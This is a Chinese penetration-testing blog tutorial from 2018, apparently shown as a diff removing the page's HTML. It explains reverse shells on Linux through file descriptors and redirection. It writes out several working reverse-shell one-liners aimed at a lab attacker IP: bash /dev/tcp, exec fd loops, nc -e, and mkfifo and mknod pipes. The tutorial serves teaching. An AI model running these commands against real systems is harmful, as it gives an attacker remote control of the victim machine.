@@ -1,113 +1,52 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Linux 反弹shell（二）反弹shell的本质 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Linux 反弹shell（二）反弹shell的本质</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Linux 反弹shell（二）反弹shell的本质</h1><div class="post-meta">Aug 5, 2018<span> | </span><span class="category"><a href="/categories/渗透测试/">渗透测试</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-什么是反弹shell"><span class="toc-number">2.</span> <span class="toc-text">0X01 什么是反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-为什么要反弹shell"><span class="toc-number">3.</span> <span class="toc-text">0X02 为什么要反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-反弹shell的本质是什么"><span class="toc-number">4.</span> <span class="toc-text">0X03 反弹shell的本质是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-常见的反弹shell-的语句怎么理解"><span class="toc-number">5.</span> <span class="toc-text">0X04 常见的反弹shell 的语句怎么理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-方法一"><span class="toc-number">5.1.</span> <span class="toc-text">1.方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-方法二"><span class="toc-number">5.2.</span> <span class="toc-text">2.方法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-方法三"><span class="toc-number">5.3.</span> <span class="toc-text">3.方法三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-方法四"><span class="toc-number">5.4.</span> <span class="toc-text">4.方法四</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-总结"><span class="toc-number">6.</span> <span class="toc-text">0X05 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-参考链接"><span class="toc-number">7.</span> <span class="toc-text">0X06 参考链接</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>在上一篇文章 <a href="www.k0rz3n.com/2018/08/05/Linux反弹shell（一）文件描述符与重定向">Linux反弹shell（一）文件描述符与重定向</a>，我们已经讨论过了反弹shell中最核心也是相对较难理解的部分，那么接下来我们就可以正式借反弹shell的实例分析回顾前一篇文章讲的知识，并且也加深对反弹shell的理解吧。</p>
-<h2 id="0X01-什么是反弹shell"><a href="#0X01-什么是反弹shell" class="headerlink" title="0X01 什么是反弹shell"></a><strong>0X01 什么是反弹shell</strong></h2><p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
-<a id="more"></a>
-<h2 id="0X02-为什么要反弹shell"><a href="#0X02-为什么要反弹shell" class="headerlink" title="0X02 为什么要反弹shell"></a><strong>0X02 为什么要反弹shell</strong></h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p>
-<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
-<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
-<p>2.它的ip会动态改变，你不能持续控制。</p>
-<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
-<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
-<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
-<h2 id="0X03-反弹shell的本质是什么"><a href="#0X03-反弹shell的本质是什么" class="headerlink" title="0X03 反弹shell的本质是什么"></a><strong>0X03 反弹shell的本质是什么</strong></h2><p>我们可以先以一个linux 下的反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，掌握了反弹的本质，再多的方法其实只是换了包装而已。</p>
-<p><strong>实验环境：</strong></p>
-<p><strong>受害者：</strong></p>
-<p>Ubuntu Linux ——&gt; 192.168.146.128 </p>
-<p><strong>攻击者：</strong></p>
-<p>Kali Linux   ——&gt; 192.168.146.129</p>
-<p>我们就以最常见的bash为例：<br>attacker机器上执行：</p>
-<pre><code>nc -lvp 2333
-</code></pre><p>victim 机器上执行：</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1
-</code></pre><p>你就会看到下图：</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell1.png" alt="此处输入图片的描述"></p>
-<p>可以看到在攻击机上出现了受害者机器的shell</p>
-<p>解释一下这条命令具体的含义：</p>
-<p><strong>1.bash -i</strong> </p>
-<p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
-<p>2）-i 这个参数表示的是产生交互式的shell</p>
-<p><strong>2./dev/tcp/ip/port</strong></p>
-<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，如下图：</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell2.png" alt="此处输入图片的描述"></p>
-<p>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
-<p><strong>实例1：</strong></p>
-<p>我们输出字符串到这个文件里</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell3.png" alt="此处输入图片的描述"></p>
-<p>攻击机上的输出</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell4.png" alt="此处输入图片的描述"></p>
-<p><strong>实例2：</strong></p>
-<p>攻击机上的输入</p>
-<p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell5.png" alt="此处输入图片的描述"></p>
-<p>受害者机器上的输出</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell6.png" alt="此处输入图片的描述"></p>
-<p><strong>3.交互重定向</strong></p>
-<p><strong>注意：</strong><br>下面的内容涉及到比较复杂的重定向和文件描述符的知识，如果理解不够深入建议看完我的上一篇文章以后再来继续阅读：</p>
-<p><strong>文章链接：</strong></p>
-<p><a href="www.k0rz3n.com/2018/08/05/Linux反弹shell（一）文件描述符与重定向/">Linux反弹shell（一）文件描述符与重定向</a></p>
-<p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上<br>在受害者机器上输入</p>
-<pre><code>bash -i &gt; /dev/tcp/192.168.146.129/2333
-</code></pre><p>示意图：</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell%E9%87%8D%E5%AE%9A%E5%90%91%E7%A4%BA%E6%84%8F%E5%9B%BE1.png" alt="此处输入图片的描述"></p>
-<p>如下图所示，任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell7.png" alt="此处输入图片的描述"></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell8.png" alt="此处输入图片的描述"></p>
-<p>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p>
-<p>于是我们似乎还需要一条这样的指令</p>
-<pre><code>bash -i &lt; /dev/tcp/192.168.146.129/2333
-</code></pre><p>示意图：</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell%E9%87%8D%E5%AE%9A%E5%90%91%E7%A4%BA%E6%84%8F%E5%9B%BE2.png" alt="此处输入图片的描述"></p>
-<p>这条指令的意思是将攻击者输入的命令输入给受害者的bash，自然就能执行了</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell11.png" alt="此处输入图片的描述"></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell12.png" alt="此处输入图片的描述"></p>
-<p>现在我们需要将两条指令结合起来（如果这条指令看不懂可以去看一下我上面提供的文章的链接再回来看这条指令）：</p>
-<pre><code>bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1
-</code></pre><p>示意图：</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell%E9%87%8D%E5%AE%9A%E5%90%91%E7%A4%BA%E6%84%8F%E5%9B%BE3.png" alt="此处输入图片的描述"></p>
-<p><strong>由这张示意图可以很清楚地看到，输入0是由/dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.156.129/2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong></p>
-<p>如下图所示，我在攻击机上输入 ifconfig，查看到的是受害者的ip ，也就是说我们目前已经基本完成了一个反弹shell 的功能。</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell9.png" alt="此处输入图片的描述"></p>
-<p><strong>注意：</strong><br>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell10.png" alt="此处输入图片的描述"></p>
-<p><strong>4. &gt;&amp;、&amp;&gt;</strong></p>
-<p>这个符号在我附上链接的那篇文章中也提到了，作用就是混合输出（错误、正确输出都输出到一个地方）</p>
-<p>现在我们解决一下前面的问题：</p>
-<pre><code>bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 2&gt;&amp;1
-</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell17.png" alt="此处输入图片的描述"></p>
-<p>可以看到命令并没有回显在受害者机器上，我们的目的达成了</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell15.png" alt="此处输入图片的描述"></p>
-<p>当然我们也可以执行与之完全等价的指令</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1
-</code></pre><p><strong>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质，以后碰到其他的反弹shell 的语句也能用类似的分析方法区分析，甚至我们也可以自己举一反三创造更加绝妙的反弹shell 的语句</strong></p>
-<h2 id="0X04-常见的反弹shell-的语句怎么理解"><a href="#0X04-常见的反弹shell-的语句怎么理解" class="headerlink" title="0X04 常见的反弹shell 的语句怎么理解"></a><strong>0X04 常见的反弹shell 的语句怎么理解</strong></h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><pre><code>bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1
-</code></pre><p>和</p>
-<pre><code>bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1
-</code></pre><p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别（我在上面给出链接的文章中也特地用加粗的形式解释了）</p>
-<h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2
-</code></pre><p>等价于 </p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2
-</code></pre><p>示意图：</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BC%B9shell%E9%87%8D%E5%AE%9A%E5%90%91%E7%A4%BA%E6%84%8F%E5%9B%BE4.png" alt="此处输入图片的描述"></p>
-<h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><pre><code>exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done
-</code></pre><p><strong>简单的解释一下：</strong></p>
-<pre><code>exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333
-</code></pre><p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过，<strong>传送门</strong>），于是我们就能通过文件描述符对这个socket连接进行操作了</p>
-<pre><code>command|while read line do .....done
-</code></pre><p>这个是一个非常经典的句子，它的原句是这样的</p>
-<pre><code>while read line
-do
-       …
-done &lt; file
-</code></pre><p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p>
-<p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
-<p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p>
-<pre><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
-</code></pre><h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p>
-<pre><code>nc -e /bin/sh 192.168.146.129 2333
-</code></pre><p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f
-</code></pre><p><strong>简单的解释：</strong></p>
-<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
-<p>类似的命令：</p>
-<pre><code>mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe
-</code></pre><h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>反弹shell方法虽然常见，方法网上一搜就是一大把的代码，但是很少有人会去仔细斟酌反弹shell的原理，我也看到有类似的文章，但是可能是由于篇幅原因并没有对文件描述符和重定向的部分做深入的讨论，导致解释语句的时候依然让人不好理解，于是这次我分成了两篇有所关联的文章彻底的剖析了一下，个人认为这个原理是非常值得大家思考的，也很有趣，如果我的文章有什么地方有问题，希望大家及时联系我。</p>
-<h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br><a href="https://blog.csdn.net/roler_/article/details/17504039" target="_blank" rel="noopener">https://blog.csdn.net/roler_/article/details/17504039</a><br><a href="http://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/153986.html</a><br><a href="https://www.zhihu.com/question/24503813" target="_blank" rel="noopener">https://www.zhihu.com/question/24503813</a></p>
-</div><div class="tags"><a href="/tags/Linux-渗透测试-备忘/">Linux 渗透测试 备忘</a></div><div class="post-nav"><a class="pre" href="/2018/09/02/Git 基本操作/">Git 基本操作</a><a class="next" href="/2018/08/05/Linux反弹shell（一）文件描述符与重定向/">Linux反弹shell（一）文件描述符与重定向</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a 